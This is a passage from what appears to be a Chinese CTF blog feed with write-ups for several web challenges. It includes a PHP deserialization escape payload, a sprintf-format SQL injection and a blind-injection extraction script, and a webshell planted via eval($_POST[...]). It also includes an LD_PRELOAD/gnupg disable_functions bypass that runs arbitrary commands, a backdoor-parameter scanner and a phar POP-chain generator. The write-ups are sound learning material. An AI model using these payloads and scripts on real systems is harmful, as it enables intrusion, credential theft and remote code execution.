<p>接着再看到源码<br><img src="https://img-blog.csdnimg.cn/20200429214336791.png" alt="在这里插入图片描述"><br>反序列化之前还需经过read,write两个函数<br><img src="https://img-blog.csdnimg.cn/2020042921453313.png" alt="在这里插入图片描述"><br>很明显的思路了，反序列化字符逃逸<br>但是不知道他的字符窜长度的变化<br>我自己做了个小测试<br>发现输入<code>\0\0\0</code>之后<br><img src="https://img-blog.csdnimg.cn/20200429215602730.png" alt="在这里插入图片描述"><br>长度变成6了，说明<code>\0\0\0</code>的长度是6，而<code>chr(0) . &#39;*&#39; . chr(0)</code>的长度则是3<br>说明经过<code>read()</code>后字符窜长度多了3<br>所以我们得让<code>s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code>插进去，<br>让原本的password变成username里的内容,从而得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:85:</span><br></pre></td></tr></table></figure>
<p>**这一段的长度是23，而经过函数变化后，会比原来的字符窜多3，所以得让上面的长度为3的倍数，于是在后面加个<code>a&quot;</code>,长度变为24，同时闭合双引号</p>
<p>从而原来的password被username吞进去，但是后面我们得闭合最后面的双引号，因为对象之前是被当做字符窜的**</p>
<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;b=a<span class="string">";s:8:"</span>password<span class="string">";O:1:"</span><span class="string">B":1:&#123;s:1:"</span><span class="string">b";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;;s:0:"</span><span class="string">";s:0"</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020042922125446.png" alt="在这里插入图片描述"></p>
<p>可以看到序列化后的内容，<code>********&quot;;s:8:&quot;password&quot;;s:85:&quot;a</code>这一段内容长度刚好是48，从而实现字符窜逃逸<br>查看源代码<br><img src="https://img-blog.csdnimg.cn/20200429221417522.png" alt="在这里插入图片描述"><br>成功调用pop链</p>
<h1 id="babytricks"><a href="#babytricks" class="headerlink" title="babytricks"></a>babytricks</h1><p> 没想到赛后环境又出来了，真的舒服<br> <img src="https://img-blog.csdnimg.cn/20200501200047479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便提交发现有一段sql语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>
<p>和我们平常见到的sql语句不同，搜了搜<br><a href="https://blog.csdn.net/weixin_41185953/article/details/80485075" target="_blank" rel="noopener">sprintf格式化注入漏洞</a><br>我看那篇文章大概就是 <strong>没做字符类型检测的最大危害就是它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空</strong></p>
<p>为了更方便理解，我自己做了个测试<br><img src="https://img-blog.csdnimg.cn/20200501211350998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以发现%1$将单引号给吞了，从而实现类似于&#39;转义单引号的注入,前面经过测试，过滤了or 我们可以用异或来进行sql注入</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;%1$&amp;passwd&#x3D;^1^1#</span><br></pre></td></tr></table></figure>
<p>观察界面，很明显有布尔回显<br>我采用的是布尔盲注<br>查用户名payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;%1$&amp;passwd&#x3D;^(ascii(substr((user),1,1))&gt;1)#</span><br></pre></td></tr></table></figure>
<p>查密码payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user&#x3D;%1$&amp;passwd&#x3D;^(ascii(substr((passwd),1,1))&gt;1)#</span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://183.129.189.60:10010/"</span></span><br><span class="line">temp = &#123;&#125;</span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="string">'''查用户名'''</span></span><br><span class="line">        payload1 =<span class="string">'^(ascii(substr((user),%d,1))&gt;%d)#'</span> % (i,mid)</span><br><span class="line">        temp = &#123;<span class="string">"user"</span>: <span class="string">"%1$"</span>, <span class="string">"passwd"</span>: payload1&#125;</span><br><span class="line"></span><br><span class="line">        <span class="string">'''查密码'''</span></span><br><span class="line">        <span class="comment"># payload2 = '^(ascii(substr((passwd),%d,1))&gt;%d)#' % (i,mid)</span></span><br><span class="line">        <span class="comment"># temp=&#123;"user":"%1$","passwd": payload2&#125;</span></span><br><span class="line">        r = requests.post(url,data=temp)</span><br><span class="line">        print(low,high,mid,<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username or password error"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    password +=chr(mid)</span><br><span class="line">    print(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password="</span>,password)</span><br></pre></td></tr></table></figure>

<p>用户名      <strong>admin</strong><br><img src="https://img-blog.csdnimg.cn/20200501213802223.png" alt="在这里插入图片描述"></p>
<p>密码  <strong>GoODLUcKcTFer202OHAckFuN</strong><br><img src="https://img-blog.csdnimg.cn/2020050121372270.png" alt="在这里插入图片描述"><br>我登录之后是这个玩意<br><img src="https://img-blog.csdnimg.cn/20200501213856176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>，想了想会不会是后台登录<br>我用御剑扫到了admin后台</p>
<p>登录之后</p>
<p>一段源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'./init.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;script&gt;window.location.href='./index.php'&lt;/script&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'shell'</span>])&#123;</span><br><span class="line">    $shell= addslashes($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">    $file = file_get_contents(<span class="string">'./shell.php'</span>);</span><br><span class="line">    $file = preg_replace(<span class="string">"/\\\$shell = '.*';/s"</span>, <span class="string">"\$shell = '&#123;$shell&#125;';"</span>, $file);</span><br><span class="line">    file_put_contents(<span class="string">'./shell.php'</span>, $file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"set your shell"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    chdir(<span class="string">"/"</span>);</span><br><span class="line">    highlight_file(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/admin.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">参考文献</a></p>
<p>利用$0将单引号吞掉，从而将webshell传入<br>我自己测试了一下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost:9090/update.php?api=;phpinfo();</span></span><br><span class="line">http:<span class="comment">//localhost:9090/update.php?api=$0</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020050210210223.png" alt="在这里插入图片描述"><br>可以发现咱们的webshell并没有被替代<br>传马</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?shell&#x3D;;eval($_POST[penson]);</span><br><span class="line">?shell&#x3D;$0</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p><img src="https://img-blog.csdnimg.cn/20200502103903976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>好家伙，访问根目录失败，我就知道没这么容易…………<br>看了web<br>绕过LD_PRELOAD<br><a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv():</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">exp链接</a></p>
<p>先去看看phpinfo<br><img src="https://img-blog.csdnimg.cn/20200502110044647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>禁用了mail，再去看看phpinfo，看到有个gnupg库，可以利用这一点，来进行绕过</p>
<p><a href="https://www.anquanke.com/post/id/197745" target="_blank" rel="noopener">参考文献</a><br>根据参考文献，上传我们的文件<br>exp文件如下:（将上面的链接改下(反正抄赵总的………………）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">    $out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">    $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">    $res = gnupg_init();</span><br><span class="line">    gnupg_seterrormode($res, GNUPG_ERROR_WARNING);</span><br><span class="line">    $info = gnupg_keyinfo($res,<span class="string">'your-key-id'</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Key-Info&lt;pre&gt;"</span>;</span><br><span class="line">    var_dump($info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传后就可以getshell了</p>
<p>查看根目录文件<br><img src="https://img-blog.csdnimg.cn/20200502124022101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag即可</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯高明的黑客</title>
    <url>/2020/04/10/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="强网杯高明的黑客"><a href="#强网杯高明的黑客" class="headerlink" title="强网杯高明的黑客"></a>强网杯高明的黑客</h1><p><img src="https://img-blog.csdnimg.cn/20200410122939350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载源码，发现里面有3002个文件，随便打开一个文件看看</p>
<a id="more"></a>
<p><img src="https://img-blog.csdnimg.cn/20200410123033702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以发现里面有很多没用的参数，打开其他文件也是如此，既然有这么多文件，是不是需要遍历文件，来获取可用的请求参数呢，例如eval，system等函数</p>
<p>在本地搭个环境跑<br><a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">我参考了这篇文章的思路</a><br>就是一次发送所有的请求，再找到可用的参数<br>之前我是慢慢遍历，真的没用，以后得多练练编程思路<br>放上我根据那篇文章的思路写的脚本，大概用了6分钟。。。。。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">#初始化变量</span><br><span class="line">t1 = time.time()   #设置开始时间</span><br><span class="line">url =<span class="string">"http://localhost/src/"</span>  #初始化url</span><br><span class="line">files = os.listdir(<span class="string">"X:\网络安全/buuoj习题\WEB\web题目\强网杯高明的黑客/src"</span>) #打开文件夹里的文件，并将文件以列表形式返回</span><br><span class="line">s = requests.Session()   #实例化一个会话保持对象</span><br><span class="line">s.keep_alive =False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">实现主要逻辑</span><br><span class="line"><span class="number">1</span>、先找到当前php文件的get，post所有参数</span><br><span class="line"><span class="number">2</span>、一次性发送所有的参数，看看能否输出想要的内容</span><br><span class="line"><span class="number">3</span>、如果有，遍历所有的get参数，post参数，找到想要的参数</span><br><span class="line">备注:</span><br><span class="line">在本地搭php环境，版本必须<span class="number">7.0</span>以上，否则不能输出想要的内容</span><br><span class="line">必须设置线程锁，否则会因为太快而被服务器拒绝请求</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">requests.Session()的讲解</span><br><span class="line">http:<span class="comment">//2.python-requests.org/zh_CN/latest/user/advanced.html</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">def run(file):</span><br><span class="line">    print(<span class="string">"开始尝试，当前文件为:"</span>,file,<span class="string">"当前时间为:"</span>,time.strftime(<span class="string">"%H:%M:%S"</span>,time.localtime())) #输出当前的文件和当前时间</span><br><span class="line"></span><br><span class="line">    #打开文件找到的get或者post请求并放到列表里</span><br><span class="line">    with open(<span class="string">"X:\网络安全/buuoj习题/WEB/web题目/强网杯高明的黑客/src/"</span> + file, encoding=<span class="string">"utf-8"</span>) as f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">        gets = re.findall(<span class="string">"\$_GET\[\'(.*?)\'\]"</span>, str(content))</span><br><span class="line">        posts = re.findall(<span class="string">"\$_POST\[\'(.*?)\'\]"</span>, str(content))</span><br><span class="line"></span><br><span class="line">    #初始化字典，以便于一次性请求所有的参数</span><br><span class="line">    params = &#123;&#125;  #初始化get请求</span><br><span class="line">    data = &#123;&#125;   #初始化post请求</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #找到的get参数赋值为输出penson</span><br><span class="line">    <span class="keyword">for</span> find1 in gets:</span><br><span class="line">        params[find1] ='echo "penson";'</span><br><span class="line"></span><br><span class="line">    #找到的post参数赋值为输出penson</span><br><span class="line">    <span class="keyword">for</span> find2 in posts:</span><br><span class="line">        data[find2] = 'echo "penson";'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #向当前的文件发送所有的请求</span><br><span class="line">    url = <span class="string">"http://localhost/src/"</span>+file</span><br><span class="line">    r = s.post(url,params=params,data=data)  #请求发送get参数和post参数</span><br><span class="line">    r.close()    #关闭内存</span><br><span class="line">    r.encoding='utf-8'   #utf-8编码，不然可能找不到</span><br><span class="line"></span><br><span class="line">    # 如果发现这个文件里有penson</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"penson"</span> in r.text:</span><br><span class="line">        found = <span class="number">0</span></span><br><span class="line">        #遍历发送get请求，如果找到就退出程序</span><br><span class="line">        <span class="keyword">for</span> get in gets:</span><br><span class="line">            new_url = url + '?&#123;&#125;=&#123;&#125;'.format(get,'echo "penson";')</span><br><span class="line">            r = s.get(new_url)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"penson"</span> in r.text:</span><br><span class="line">                found =<span class="number">1</span></span><br><span class="line">                t2 = time.time()</span><br><span class="line">                print(<span class="string">"find it"</span>,new_url)</span><br><span class="line">                print(time.strftime(<span class="string">"%H:%M:%S"</span>,time.localtime()))</span><br><span class="line">                print(<span class="string">"一共用时"</span>,time.strftime(<span class="string">"%M:%S"</span>,time.localtime(t2-t1)))</span><br><span class="line">                <span class="built_in">exit</span>()</span><br><span class="line"></span><br><span class="line">        #如果没找到，遍历发送post请求</span><br><span class="line">        <span class="keyword">if</span> found == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> post in posts:</span><br><span class="line">                r = s.post(url,data=post)</span><br><span class="line">                r.close()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"penson"</span> in r.text:</span><br><span class="line">                    found =<span class="number">1</span></span><br><span class="line">                    t2 = time.time()</span><br><span class="line">                    print(<span class="string">"find it"</span>,url,<span class="string">"post:"</span>,post)</span><br><span class="line">                    print(time.strftime(<span class="string">"%H:%M:%S"</span>,time.localtime()))</span><br><span class="line">                    print(<span class="string">"一共用时"</span>, time.strftime(<span class="string">"%M:%S"</span>, time.localtime(t3 - t1)))</span><br><span class="line">                    <span class="built_in">exit</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file in files:</span><br><span class="line">	run(file)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>华北赛区]</title>
    <url>/2020/04/11/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="Day1-Web1-Dropbox"><a href="#Day1-Web1-Dropbox" class="headerlink" title="Day1 Web1]Dropbox"></a>Day1 Web1]Dropbox</h1><p>登陆界面，先不用试sql注入，因为那里有注册，先进去注册登录</p>
<a id="more"></a>
<p><img src="https://img-blog.csdnimg.cn/20200411151101414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以上传文件，文件上传漏洞是不可取的，不知道文件上传后的路径在哪，发现上传文件后可以下载，抓包看看是否存在任意文件下载<br><img src="https://img-blog.csdnimg.cn/20200411151218478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以发现存在文件下载漏洞，filename这个变量我们可以控制，php文件如下</p>
<p><img src="https://img-blog.csdnimg.cn/20200411151247150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先看到class.php文件，看看有没有高危函数<br><img src="https://img-blog.csdnimg.cn/20200411151954525.png" alt="在这里插入图片描述"><br>可以发现在USER类里用了 bind_param() 绑定了username这个变量，所以是不存在sql注入的<br><a href="https://blog.csdn.net/alex_xlin/article/details/81512796" target="_blank" rel="noopener">参考文献</a></p>
<p><img src="https://img-blog.csdnimg.cn/20200411151321510.png" alt="在这里插入图片描述"><br>发现在File类的close方法里，有个file_get_contents()，肯定是需要调用这个方法的，找找其他php文件有没有用到这个方法</p>
<p>在download.php文件和delete.php文件里发现利用到了。<br><img src="https://img-blog.csdnimg.cn/20200411153634479.png" alt="在这里插入图片描述"><br>if判断里存在open方法，且该方法存在file_exists可以触发反序列化，但是由于不允许有flag字符，所以不能用close()方法来进行任意文件读取，这也说明找准了做题的思路。</p>
<p>再看看class.php里有啥</p>
<p><img src="https://img-blog.csdnimg.cn/20200411153936743.png" alt="在这里插入图片描述"></p>
<p>在FileList类中发现了<strong>call()这个魔术方法，可以赋值函数<br><img src="https://img-blog.csdnimg.cn/2020041116162383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">且</strong>destruct魔术方法存在调用$this-&gt;results内容</p>
<p>这两个魔术方法就是在提示我们要用到phar反序列化</p>
<p><a href="https://paper.seebug.org/680/#4-optional-a-signature-for-verifying-phar-integrity-phar-file-format-only" target="_blank" rel="noopener">phar反序列化原理以及讲解</a></p>
<p>就是调用FileList类里的<strong>call方法，让$this-&gt;results这个数组等于close()，再用</strong>destruct魔术方法调用close()。<br><img src="https://img-blog.csdnimg.cn/20200411163416655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><a href="https://zhzhdoai.github.io/2019/09/27/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E4%B8%80/" target="_blank" rel="noopener">上图借用大佬的博客</a><br><del>我不知道大佬们是咋晓得flag.txt这个文件的，我还以为是flag.php。。。。。。。。</del>  </p>
<p>整体思路如下<br>要让$this-&gt;results这个数组等于close()，可以发现在 User类的__destruct魔术方法里有个同名的函数close（），可以利用这一点让属性db等于FileList()这个类.再让FileList()类里的属性files等于File类，从而将File类里close（）方法赋值给<br>$this-&gt;results数组，<br>要让File类里的filename = flag.txt，才能实现我们的目标<br>再通过<br>__destruct魔术方法 调用close方法<br><img src="https://img-blog.csdnimg.cn/20200411165707541.png" alt="在这里插入图片描述"><br>生成的phar文件代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db =(<span class="keyword">new</span> FileList());</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>因为文件上传做了限制，将生成的文件后缀改为jpg上传，接下来如何让他输出flag.txt呢<br>看到delete.php</p>
<p><img src="https://img-blog.csdnimg.cn/20200411170530469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现这个用了File类。并输出了文件内容，删除文件后，抓包用phar伪协议即可<br><img src="https://img-blog.csdnimg.cn/20200411170628658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p><img src="https://img-blog.csdnimg.cn/20200411193742347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没想到国赛也这么皮。哈哈哈哈。<br><img src="https://img-blog.csdnimg.cn/20200411195211269.png" alt="在这里插入图片描述"><br>源码提示我们要买到lv6<br>用脚本跑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">"http://0a047e4f-ced1-4f90-9dcd-663cef470c0f.node3.buuoj.cn/shop?page=&#123;&#125;"</span></span><br><span class="line">    url = url.format(i)</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">"find it:"</span> ,url)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>页数为181</p>
<p><img src="https://img-blog.csdnimg.cn/20200411195515457.png" alt="在这里插入图片描述"></p>
